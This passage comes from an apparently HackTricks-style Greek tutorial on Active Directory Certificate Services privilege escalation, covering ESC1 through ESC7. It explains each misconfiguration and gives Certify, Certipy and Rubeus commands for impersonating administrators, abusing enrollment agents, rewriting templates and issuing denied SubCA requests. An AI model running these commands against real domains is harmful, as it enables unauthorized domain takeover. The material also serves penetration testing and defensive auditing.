# AD CS Ανάβαθμιση δικαιωμάτων στο Domain

{{#include ../../../banners/hacktricks-training.md}}


**Αυτή είναι μια περίληψη των τμημάτων τεχνικών ανάβαθμισης από τα άρθρα:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Λανθασμένα Διαμορφωμένα Πρότυπα Πιστοποιητικών - ESC1

### Εξήγηση

### Λανθασμένα Πρότυπα Πιστοποιητικών - ESC1 (Επεξήγηση)

- **Δικαιώματα εγγραφής χορηγούνται σε χρήστες με χαμηλά προνόμια από το Enterprise CA.**
- **Δεν απαιτείται έγκριση από διευθυντή.**
- **Δεν απαιτούνται υπογραφές από εξουσιοδοτημένο προσωπικό.**
- **Οι security descriptors στα πρότυπα πιστοποιητικών είναι υπερβολικά επιεικείς, επιτρέποντας σε χρήστες με χαμηλά προνόμια να αποκτήσουν δικαιώματα εγγραφής.**
- **Τα πρότυπα πιστοποιητικών έχουν διαμορφωθεί ώστε να ορίζουν EKU που διευκολύνουν την αυθεντικοποίηση:**
- Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
- **Η δυνατότητα για τους αιτούντες να συμπεριλάβουν subjectAltName στο Certificate Signing Request (CSR) επιτρέπεται από το πρότυπο:**
- Το Active Directory (AD) δίνει προτεραιότητα στο subjectAltName (SAN) σε ένα πιστοποιητικό για επαλήθευση ταυτότητας αν υπάρχει. Αυτό σημαίνει ότι καθορίζοντας το SAN σε ένα CSR, μπορεί να ζητηθεί πιστοποιητικό για να προσποιηθεί οποιονδήποτε χρήστη (π.χ. έναν domain administrator). Το αν μπορεί ένας αιτών να καθορίσει ένα SAN υποδεικνύεται στο αντικείμενο προτύπου πιστοποιητικού στο AD μέσω της ιδιότητας `mspki-certificate-name-flag`. Αυτή η ιδιότητα είναι ένα bitmask, και η παρουσία της σημαίας `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` επιτρέπει στον αιτούντα να προσδιορίσει το SAN.

> [!CAUTION]
> Η παραπάνω διαμόρφωση επιτρέπει σε χρήστες με χαμηλά προνόμια να ζητούν πιστοποιητικά με οποιοδήποτε SAN, επιτρέποντας αυθεντικοποίηση ως οποιοδήποτε domain principal μέσω Kerberos ή SChannel.

Αυτή η λειτουργία μερικές φορές ενεργοποιείται για να υποστηρίξει τη δημιουργία HTTPS ή πιστοποιητικών host σε πραγματικό χρόνο από προϊόντα ή υπηρεσίες ανάπτυξης, ή λόγω έλλειψης κατανόησης.

Σημειώνεται ότι η δημιουργία ενός πιστοποιητικού με αυτή την επιλογή προκαλεί μια προειδοποίηση, κάτι που δεν συμβαίνει όταν ένα υπάρχον πρότυπο πιστοποιητικού (όπως το πρότυπο `WebServer`, το οποίο έχει ενεργοποιημένη τη σημαία `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) αντιγράφεται και στη συνέχεια τροποποιείται για να συμπεριλάβει ένα authentication OID.

### Κατάχρηση

Για να **βρείτε ευάλωτα πρότυπα πιστοποιητικών** μπορείτε να εκτελέσετε:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Για να **καταχραστείτε αυτή την ευπάθεια για να προσποιηθείτε έναν διαχειριστή**, μπορεί κανείς να εκτελέσει:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Στη συνέχεια μπορείτε να μετατρέψετε το παραχθέν **πιστοποιητικό σε μορφή `.pfx`** και να το χρησιμοποιήσετε για **αυθεντικοποίηση χρησιμοποιώντας Rubeus ή certipy** ξανά:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Τα Windows εκτελέσιμα "Certreq.exe" & "Certutil.exe" μπορούν να χρησιμοποιηθούν για να δημιουργήσουν το PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Η απογραφή των προτύπων πιστοποιητικών στο σχήμα διαμόρφωσης του AD Forest, συγκεκριμένα εκείνων που δεν απαιτούν έγκριση ή υπογραφές, που διαθέτουν Client Authentication ή Smart Card Logon EKU, και με το `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag ενεργοποιημένο, μπορεί να πραγματοποιηθεί εκτελώντας το ακόλουθο ερώτημα LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Εσφαλμένα διαμορφωμένα πρότυπα πιστοποιητικών - ESC2

### Εξήγηση

Το δεύτερο σενάριο κατάχρησης είναι μια παραλλαγή του πρώτου:

1. Τα δικαιώματα εγγραφής (enrollment) χορηγούνται σε χρήστες με χαμηλά προνόμια από την Enterprise CA.
2. Η απαίτηση έγκρισης από manager έχει απενεργοποιηθεί.
3. Η ανάγκη για εξουσιοδοτημένες υπογραφές παραλείπεται.
4. Ένας υπερβολικά επιεικής security descriptor στο πρότυπο πιστοποιητικού χορηγεί δικαιώματα εγγραφής πιστοποιητικών σε χρήστες με χαμηλά προνόμια.
5. **Το πρότυπο πιστοποιητικού ορίζεται να περιλαμβάνει το Any Purpose EKU ή no EKU.**

Το **Any Purpose EKU** επιτρέπει σε έναν επιτιθέμενο να αποκτήσει ένα πιστοποιητικό για **οποιονδήποτε σκοπό**, συμπεριλαμβανομένης της client authentication, server authentication, code signing, κ.λπ. Η ίδια τεχνική που χρησιμοποιείται για το **ESC3** μπορεί να αξιοποιηθεί για την εκμετάλλευση αυτού του σεναρίου.

Πιστοποιητικά με **no EKUs**, τα οποία λειτουργούν ως subordinate CA certificates, μπορούν να εκμεταλλευτούν για **οποιονδήποτε σκοπό** και μπορούν **επίσης να χρησιμοποιηθούν για την υπογραφή νέων πιστοποιητικών**. Συνεπώς, ένας επιτιθέμενος θα μπορούσε να καθορίσει αυθαίρετα EKUs ή άλλα πεδία στα νέα πιστοποιητικά αξιοποιώντας ένα subordinate CA certificate.

Ωστόσο, νέα πιστοποιητικά που δημιουργούνται για **domain authentication** δεν θα λειτουργήσουν εάν το subordinate CA δεν εμπιστεύεται από το αντικείμενο **`NTAuthCertificates`**, που είναι η προεπιλεγμένη ρύθμιση. Παρ’ όλα αυτά, ένας επιτιθέμενος μπορεί να δημιουργήσει **νέα πιστοποιητικά με οποιοδήποτε EKU** και αυθαίρετες τιμές πιστοποιητικού. Αυτά θα μπορούσαν να **κακοχρησιμοποιηθούν** για μεγάλο εύρος σκοπών (π.χ. code signing, server authentication, κ.λπ.) και θα μπορούσαν να έχουν σημαντικές επιπτώσεις για άλλες εφαρμογές στο δίκτυο όπως SAML, AD FS, ή IPSec.

Για να απαριθμήσετε τα πρότυπα που ταιριάζουν με αυτό το σενάριο μέσα στο configuration schema του AD Forest, μπορείτε να εκτελέσετε το ακόλουθο LDAP query:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Λανθασμένα ρυθμισμένα Enrolment Agent Templates - ESC3

### Επεξήγηση

Αυτό το σενάριο είναι σαν το πρώτο και το δεύτερο αλλά με **κατάχρηση** ενός **διαφορετικού EKU** (Certificate Request Agent) και **2 διαφορετικά templates** (οπότε έχει 2 σετ απαιτήσεων),

Το **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), γνωστό ως **Enrollment Agent** στην τεκμηρίωση της Microsoft, επιτρέπει σε έναν principal να **enroll** για ένα **certificate** εκ μέρους άλλου χρήστη.

Ο **“enrollment agent”** εγγράφεται σε τέτοιο **template** και χρησιμοποιεί το προκύπτον **certificate** για να co-sign ένα CSR εκ μέρους του άλλου χρήστη. Στη συνέχεια **στέλνει** το **co-signed CSR** στην CA, εγγράφεται σε ένα **template** που **επιτρέπει “enroll on behalf of”**, και η CA απαντά με ένα **certificate** που ανήκει στον “άλλο” χρήστη.

**Απαιτήσεις 1:**

- Enrollment rights δίνονται σε low-privileged users από την Enterprise CA.
- Η απαίτηση για manager approval παραλείπεται.
- Δεν υπάρχει απαίτηση για authorized signatures.
- Ο security descriptor του certificate template είναι υπερβολικά επιεικής, δίνοντας enrollment rights σε low-privileged users.
- Το certificate template περιλαμβάνει το Certificate Request Agent EKU, επιτρέποντας το αίτημα άλλων certificate templates εκ μέρους άλλων principals.

**Απαιτήσεις 2:**

- Η Enterprise CA δίνει enrollment rights σε low-privileged users.
- Η manager approval παρακαμπτόταν.
- Η schema version του template είναι είτε 1 είτε μεγαλύτερη του 2, και καθορίζει ένα Application Policy Issuance Requirement που απαιτεί το Certificate Request Agent EKU.
- Ένα EKU ορισμένο στο certificate template επιτρέπει domain authentication.
- Περιορισμοί για enrollment agents δεν εφαρμόζονται στην CA.

### Κατάχρηση

Μπορείτε να χρησιμοποιήσετε [**Certify**](https://github.com/GhostPack/Certify) ή [**Certipy**](https://github.com/ly4k/Certipy) για να εκμεταλλευτείτε αυτό το σενάριο:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Οι χρήστες που επιτρέπεται να αποκτήσουν ένα enrollment agent certificate, τα templates στα οποία οι enrollment agents έχουν δικαίωμα εγγραφής, και οι accounts εκ μέρους των οποίων μπορεί να δράσει ο enrollment agent μπορούν να περιοριστούν από enterprise CAs. Αυτό επιτυγχάνεται ανοίγοντας το `certsrc.msc` snap-in, κάνοντας δεξί κλικ στην CA, επιλέγοντας Properties και στη συνέχεια μεταβαίνοντας στην καρτέλα “Enrollment Agents”.

Ωστόσο, σημειώνεται ότι η προεπιλεγμένη ρύθμιση για τις CAs είναι “Do not restrict enrollment agents.” Όταν οι διαχειριστές ενεργοποιούν τον περιορισμό στους enrollment agents, ρυθμίζοντάς τον σε “Restrict enrollment agents”, η προεπιλεγμένη διαμόρφωση παραμένει εξαιρετικά επιεικής. Επιτρέπει στο Everyone να εγγραφεί σε όλα τα templates ως οποιοσδήποτε.

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

Ο security descriptor σε certificate templates ορίζει τα permissions που κατέχουν συγκεκριμένα AD principals σχετικά με το template.

Εάν ένας attacker κατέχει τα απαραίτητα permissions για να αλλάξει ένα template και να εισάγει οποιεσδήποτε exploitable misconfigurations που περιγράφονται σε προηγούμενες ενότητες, αυτό μπορεί να διευκολύνει escalation προνομίων.

Σημαντικά permissions που εφαρμόζονται σε certificate templates περιλαμβάνουν:

- **Owner:** Χορηγεί έμμεσο έλεγχο πάνω στο αντικείμενο, επιτρέποντας την τροποποίηση οποιωνδήποτε attributes.
- **FullControl:** Ενεργοποιεί πλήρη εξουσία πάνω στο αντικείμενο, συμπεριλαμβανομένης της δυνατότητας αλλαγής οποιωνδήποτε attributes.
- **WriteOwner:** Επιτρέπει την αλλαγή του owner του αντικειμένου σε έναν principal υπό τον έλεγχο του attacker.
- **WriteDacl:** Επιτρέπει την προσαρμογή των access controls, ενδεχομένως δίνοντας σε έναν attacker FullControl.
- **WriteProperty:** Εξουσιοδοτεί την επεξεργασία οποιωνδήποτε properties του αντικειμένου.

### Abuse

Για να εντοπίσετε principals με δικαιώματα επεξεργασίας σε templates και άλλα PKI αντικείμενα, κάντε enumeration με Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 είναι όταν ένας χρήστης έχει δικαιώματα εγγραφής σε ένα πρότυπο πιστοποιητικού. Αυτό, για παράδειγμα, μπορεί να καταχραστεί ώστε να αντικατασταθεί η διαμόρφωση του προτύπου πιστοποιητικού και να καταστήσει το πρότυπο ευάλωτο σε ESC1.

Όπως βλέπουμε στο μονοπάτι πιο πάνω, μόνο `JOHNPC` έχει αυτά τα δικαιώματα, αλλά ο χρήστης μας `JOHN` έχει τη νέα ακμή `AddKeyCredentialLink` προς `JOHNPC`. Επειδή αυτή η τεχνική σχετίζεται με πιστοποιητικά, έχω υλοποιήσει και αυτή την επίθεση, η οποία είναι γνωστή ως [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Ιδού μια μικρή επίδειξη της εντολής του Certipy `shadow auto` για την ανάκτηση του NT hash του θύματος.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** μπορεί να αντικαταστήσει τη διαμόρφωση ενός προτύπου πιστοποιητικού με μία εντολή. Κατά **προεπιλογή**, **Certipy** θα **αντικαταστήσει** τη διαμόρφωση ώστε να γίνει **ευάλωτη σε ESC1**. Μπορούμε επίσης να καθορίσουμε την **`-save-old` παράμετρο για να αποθηκεύσουμε την παλιά διαμόρφωση**, κάτι που θα είναι χρήσιμο για την **επαναφορά** της διαμόρφωσης μετά την επίθεσή μας.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Ευάλωτος Έλεγχος Πρόσβασης Αντικειμένων PKI - ESC5

### Εξήγηση

Ο εκτεταμένος ιστός αλληλεπιδραστικών σχέσεων βασισμένων σε ACL, που περιλαμβάνει πολλά αντικείμενα πέρα από τα certificate templates και την certificate authority, μπορεί να επηρεάσει την ασφάλεια ολόκληρου του συστήματος AD CS. Αυτά τα αντικείμενα, που μπορούν να επηρεάσουν σημαντικά την ασφάλεια, περιλαμβάνουν:

- Το AD computer object του CA server, το οποίο μπορεί να παραβιαστεί μέσω μηχανισμών όπως S4U2Self ή S4U2Proxy.
- Ο RPC/DCOM server του CA server.
- Οποιοδήποτε κατώτερο AD object ή container μέσα στην ειδική διαδρομή container `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Αυτή η διαδρομή περιλαμβάνει, αλλά δεν περιορίζεται σε, containers και αντικείμενα όπως το Certificate Templates container, το Certification Authorities container, το NTAuthCertificates object και το Enrollment Services Container.

Η ασφάλεια του συστήματος PKI μπορεί να υπονομευθεί εάν ένας χαμηλά εξουσιοδοτημένος επιτιθέμενος καταφέρει να αποκτήσει έλεγχο σε οποιοδήποτε από αυτά τα κρίσιμα στοιχεία.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Εξήγηση

Το θέμα που συζητείται στο [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) αγγίζει επίσης τις επιπτώσεις της **`EDITF_ATTRIBUTESUBJECTALTNAME2`** σημαίας, όπως περιγράφονται από τη Microsoft. Αυτή η ρύθμιση, όταν ενεργοποιηθεί σε μια Certification Authority (CA), επιτρέπει την εισαγωγή **τιμών ορισμένων από τον χρήστη** στο **subject alternative name** για **οποιοδήποτε request**, συμπεριλαμβανομένων αυτών που κατασκευάζονται από Active Directory®. Κατά συνέπεια, αυτή η δυνατότητα επιτρέπει σε έναν **εισβολέα** να εγγραφεί μέσω **οποιουδήποτε template** ρυθμισμένου για domain **authentication**—συγκεκριμένα αυτών που είναι ανοιχτά για εγγραφή από **unprivileged** χρήστες, όπως το standard User template. Ως αποτέλεσμα, μπορεί να αποκτηθεί ένα πιστοποιητικό που επιτρέπει στον εισβολέα να αυθεντικοποιηθεί ως domain administrator ή **οποιοδήποτε άλλο ενεργό ον** εντός του domain.

**Σημείωση**: Η προσέγγιση για την προσθήκη **alternative names** σε ένα Certificate Signing Request (CSR), μέσω του `-attrib "SAN:"` ορίσματος στο `certreq.exe` (αναφερόμενο ως “Name Value Pairs”), παρουσιάζει μια **διαφορά** σε σχέση με τη στρατηγική εκμετάλλευσης των SANs στο ESC1. Εδώ, η διάκριση έγκειται στο **πώς τα στοιχεία λογαριασμού ενσωματώνονται**—μέσα σε ένα certificate attribute, παρά σε ένα extension.

### Κατάχρηση

Για να επαληθεύσουν αν η ρύθμιση είναι ενεργοποιημένη, οι οργανισμοί μπορούν να χρησιμοποιήσουν την ακόλουθη εντολή με το `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Αυτή η λειτουργία ουσιαστικά χρησιμοποιεί **remote registry access**, συνεπώς μια εναλλακτική προσέγγιση μπορεί να είναι:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Εργαλεία όπως [**Certify**](https://github.com/GhostPack/Certify) και [**Certipy**](https://github.com/ly4k/Certipy) είναι ικανά να εντοπίσουν αυτή τη λανθασμένη διαμόρφωση και να την εκμεταλλευτούν:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Για να αλλάξετε αυτές τις ρυθμίσεις, υπό την προϋπόθεση ότι κάποιος κατέχει δικαιώματα **διαχειριστή τομέα** ή ισοδύναμα, η ακόλουθη εντολή μπορεί να εκτελεστεί από οποιονδήποτε σταθμό εργασίας:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Για να απενεργοποιήσετε αυτή τη ρύθμιση στο περιβάλλον σας, η σημαία μπορεί να αφαιρεθεί με:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Μετά τις ενημερώσεις ασφαλείας του Μαΐου 2022, τα νεοεκδοθέντα **certificates** θα περιέχουν μια **security extension** που ενσωματώνει την ιδιότητα **requester's `objectSid` property**. Για το ESC1, αυτό το SID προέρχεται από το καθορισμένο SAN. Ωστόσο, για το **ESC6**, το SID αντανακλά το **requester's `objectSid`**, όχι το SAN.\
> Για να εκμεταλλευτείτε το ESC6, είναι απαραίτητο το σύστημα να είναι ευάλωτο σε ESC10 (Weak Certificate Mappings), το οποίο προτεραιοποιεί το **SAN over the new security extension**.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Ο έλεγχος πρόσβασης για μια certificate authority διατηρείται μέσω ενός συνόλου δικαιωμάτων που καθορίζουν τις ενέργειες της CA. Αυτά τα δικαιώματα μπορούν να προβληθούν ανοίγοντας το `certsrv.msc`, κάνοντας δεξί κλικ σε μια CA, επιλέγοντας Properties, και στη συνέχεια μεταβαίνοντας στην Security tab. Επιπλέον, τα δικαιώματα μπορούν να απαριθμηθούν χρησιμοποιώντας το PSPKI module με εντολές όπως:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Αυτό παρέχει πληροφορίες σχετικά με τα κύρια δικαιώματα, συγκεκριμένα τα **`ManageCA`** και **`ManageCertificates`**, που αντιστοιχούν στους ρόλους «διαχειριστής CA» και «Διαχειριστής Πιστοποιητικών» αντίστοιχα.

#### Κατάχρηση

Η κατοχή των δικαιωμάτων **`ManageCA`** σε μια Αρχή Πιστοποιητικών (CA) επιτρέπει στον principal να χειρίζεται ρυθμίσεις απομακρυσμένα χρησιμοποιώντας PSPKI. Αυτό περιλαμβάνει την ενεργοποίηση/απενεργοποίηση της σημαίας **`EDITF_ATTRIBUTESUBJECTALTNAME2`** για να επιτραπεί η καθορισμός SAN σε οποιοδήποτε template, κάτι κρίσιμο για domain escalation.

Η απλοποίηση αυτής της διαδικασίας μπορεί να επιτευχθεί μέσω της χρήσης του PSPKI’s **Enable-PolicyModuleFlag** cmdlet, επιτρέποντας τροποποιήσεις χωρίς άμεση χρήση του GUI.

Η κατοχή των δικαιωμάτων **`ManageCertificates`** διευκολύνει την έγκριση αιτημάτων σε εκκρεμότητα, παρακάμπτοντας ουσιαστικά την προστασία «CA certificate manager approval».

Μια συνδυαστική χρήση των modules **Certify** και **PSPKI** μπορεί να χρησιμοποιηθεί για την υποβολή αίτησης, την έγκριση και το κατέβασμα ενός πιστοποιητικού:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Επίθεση 2

#### Επεξήγηση

> [!WARNING]
> Στην **προηγούμενη επίθεση** οι άδειες **`Manage CA`** χρησιμοποιήθηκαν για να **ενεργοποιήσουν** τη σημαία **EDITF_ATTRIBUTESUBJECTALTNAME2** για να εκτελεστεί η **ESC6 attack**, αλλά αυτό δεν θα έχει κανένα αποτέλεσμα μέχρι να γίνει επανεκκίνηση της υπηρεσίας CA (`CertSvc`). Όταν ένας χρήστης έχει το δικαίωμα πρόσβασης `Manage CA`, επιτρέπεται επίσης στον χρήστη να **επανεκκινήσει την υπηρεσία**. Ωστόσο, αυτό **δεν σημαίνει ότι ο χρήστης μπορεί να επανεκκινήσει την υπηρεσία απομακρυσμένα**. Επιπλέον, η **ESC6 μπορεί να μην λειτουργήσει άμεσα** στην πλειονότητα των patched περιβαλλόντων λόγω των ενημερώσεων ασφαλείας του Μαΐου 2022.

Επομένως, παρουσιάζεται εδώ μια άλλη επίθεση.

Προαπαιτούμενα:

- Only **`ManageCA` permission**
- **`Manage Certificates`** permission (μπορεί να χορηγηθεί από **`ManageCA`**)
- Το πρότυπο πιστοποιητικού **`SubCA`** πρέπει να είναι **ενεργοποιημένο** (μπορεί να ενεργοποιηθεί από **`ManageCA`**)

Η τεχνική βασίζεται στο γεγονός ότι χρήστες με τα δικαιώματα `Manage CA` _και_ `Manage Certificates` μπορούν να **υποβάλουν αποτυχημένες αιτήσεις πιστοποιητικών**. Το πρότυπο πιστοποιητικού **`SubCA`** είναι **ευάλωτο στο ESC1**, αλλά **μόνο οι διαχειριστές** μπορούν να εγγραφούν στο πρότυπο. Ως εκ τούτου, ένας **χρήστης** μπορεί να **ζητήσει** εγγραφή στο **`SubCA`** - που θα **απορριφθεί** - αλλά στη συνέχεια να **εκδοθεί από τον διαχειριστή**.

#### Κατάχρηση

Μπορείτε να **παραχωρήσετε στον εαυτό σας το `Manage Certificates`** δικαίωμα πρόσβασης προσθέτοντας τον χρήστη σας ως νέο officer.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Το πρότυπο **`SubCA`** μπορεί να **ενεργοποιηθεί στον CA** με την παράμετρο `-enable-template`. Από προεπιλογή, το πρότυπο `SubCA` είναι ενεργοποιημένο.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Αν έχουμε εκπληρώσει τις προαπαιτήσεις για αυτή την επίθεση, μπορούμε να ξεκινήσουμε **ζητώντας ένα πιστοποιητικό βάσει του προτύπου `SubCA`**.

**Αυτό το αίτημα θα απορριφθεί**, αλλά θα αποθηκεύσουμε το ιδιωτικό κλειδί και θα σημειώσουμε το ID του αιτήματος.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Με τα **`Manage CA` και `Manage Certificates`**, μπορούμε στη συνέχεια να **εκδώσουμε το αποτυχημένο αίτημα πιστοποιητικού** χρησιμοποιώντας την εντολή `ca` και την παράμετρο `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Και τέλος, μπορούμε να **ανακτήσουμε το εκδοθέν πιστοποιητικό** με την εντολή `req` και την παράμετρο `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Επίθεση 3 – Manage Certificates Extension Abuse (SetExtension)

#### Εξήγηση

Εκτός από τις κλασικές καταχρήσεις ESC7 (ενεργοποίηση EDITF attributes ή έγκριση εκκρεμών αιτήσεων), το **Certify 2.0** αποκάλυψε ένα εντελώς νέο primitive που απαιτεί μόνο το ρόλο *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) στον Enterprise CA.

Η μέθοδος RPC `ICertAdmin::SetExtension` μπορεί να εκτελεστεί από οποιοδήποτε principal διαθέτει *Manage Certificates*. Ενώ η μέθοδος παραδοσιακά χρησιμοποιούνταν από νόμιμους CAs για να ενημερώνει extensions σε **εκκρεμείς** αιτήσεις, ένας επιτιθέμενος μπορεί να την καταχραστεί για να **προσθέσει μια *μη-προεπιλεγμένη* επέκταση πιστοποιητικού** (π.χ. ένα custom *Certificate Issuance Policy* OID όπως `1.1.1.1`) σε μια αίτηση που περιμένει έγκριση.

Επειδή το στοχευμένο template ΔΕΝ ορίζει προεπιλεγμένη τιμή για εκείνη την επέκταση, η CA δεν θα αντικαταστήσει την τιμή ελεγχόμενη από τον επιτιθέμενο όταν η αίτηση τελικά εκδοθεί. Το προκύπτον πιστοποιητικό περιέχει έτσι μια επέκταση επιλεγμένη από τον επιτιθέμενο που μπορεί να:

* Ικανοποιήσει απαιτήσεις Application / Issuance Policy άλλων ευάλωτων templates (οδηγώντας σε privilege escalation).
* Ενέχει πρόσθετα EKUs ή πολιτικές που δίνουν στο πιστοποιητικό απροσδόκητη εμπιστοσύνη σε τρίτα συστήματα.

Εν συντομία, το *Manage Certificates* – που προηγουμένως θεωρούνταν το «λιγότερο ισχυρό» μισό του ESC7 – μπορεί τώρα να αξιοποιηθεί για πλήρη privilege escalation ή μακροχρόνια persistence, χωρίς να πειράξει τη ρύθμιση της CA ή να απαιτήσει το πιο περιοριστικό δικαίωμα *Manage CA*.

#### Abusing the primitive with Certify 2.0

